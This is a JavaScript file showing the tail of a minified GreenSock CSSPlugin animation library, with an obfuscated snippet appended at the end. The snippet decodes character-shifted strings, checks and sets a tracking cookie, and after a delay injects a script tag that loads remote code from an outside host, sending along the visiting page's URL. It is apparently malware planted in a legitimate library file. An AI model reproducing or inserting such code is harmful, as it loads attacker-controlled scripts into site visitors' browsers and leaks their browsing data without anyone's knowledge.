          (l._linkCSSP = function (t, e, i, r) {
            return (
              t &&
                (e && (e._prev = t),
                t._next && (t._next._prev = t._prev),
                t._prev
                  ? (t._prev._next = t._next)
                  : this._firstPT === t &&
                    ((this._firstPT = t._next), (r = !0)),
                i
                  ? (i._next = t)
                  : r || null !== this._firstPT || (this._firstPT = t),
                (t._next = e),
                (t._prev = i)),
              t
            );
          }),
          (l._mod = function (t) {
            for (var e = this._firstPT; e; )
              "function" == typeof t[e.p] && (e.r = t[e.p]), (e = e._next);
          }),
          (l._kill = function (e) {
            var i,
              r,
              n,
              s = e;
            if (e.autoAlpha || e.alpha) {
              for (r in ((s = {}), e)) s[r] = e[r];
              (s.opacity = 1), s.autoAlpha && (s.visibility = 1);
            }
            for (
              e.className &&
                (i = this._classNamePT) &&
                ((n = i.xfirst) && n._prev
                  ? this._linkCSSP(n._prev, i._next, n._prev._prev)
                  : n === this._firstPT && (this._firstPT = i._next),
                i._next && this._linkCSSP(i._next, i._next._next, n._prev),
                (this._classNamePT = null)),
                i = this._firstPT;
              i;

            )
              i.plugin &&
                i.plugin !== r &&
                i.plugin._kill &&
                (i.plugin._kill(e), (r = i.plugin)),
                (i = i._next);
            return t.prototype._kill.call(this, s);
          });
        var re = function (t, e, i) {
          var r, n, s, o;
          if (t.slice) for (n = t.length; -1 < --n; ) re(t[n], e, i);
          else
            for (n = (r = t.childNodes).length; -1 < --n; )
              (o = (s = r[n]).type),
                s.style && (e.push(d(s)), i && i.push(s)),
                (1 !== o && 9 !== o && 11 !== o) ||
                  !s.childNodes.length ||
                  re(s, e, i);
        };
        return (
          (o.cascadeTo = function (t, i, r) {
            var n,
              s,
              o,
              a,
              u = e.to(t, i, r),
              l = [u],
              h = [],
              p = [],
              f = [],
              c = e._internals.reservedProps;
            for (
              t = u._targets || u.target,
                re(t, h, f),
                u.render(i, !0, !0),
                re(t, p),
                u.render(0, !0, !0),
                u._enabled(!0),
                n = f.length;
              -1 < --n;

            )
              if ((s = m(f[n], h[n], p[n])).firstMPT) {
                for (o in ((s = s.difs), r)) c[o] && (s[o] = r[o]);
                for (o in ((a = {}), s)) a[o] = h[n][o];
                l.push(e.fromTo(f[n], i, a, s));
              }
            return l;
          }),
          t.activate([o]),
          o
        );
      },
      !0
    );
  }),
  _gsScope._gsDefine && _gsScope._gsQueue.pop()(),
  (function () {
    "use strict";
    function t() {
      return (_gsScope.GreenSockGlobals || _gsScope).CSSPlugin;
    }
    "undefined" != typeof module && module.exports
      ? (require("../TweenLite.min.js"), (module.exports = t()))
      : "function" == typeof define && define.amd && define(["TweenLite"], t);
  })();
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
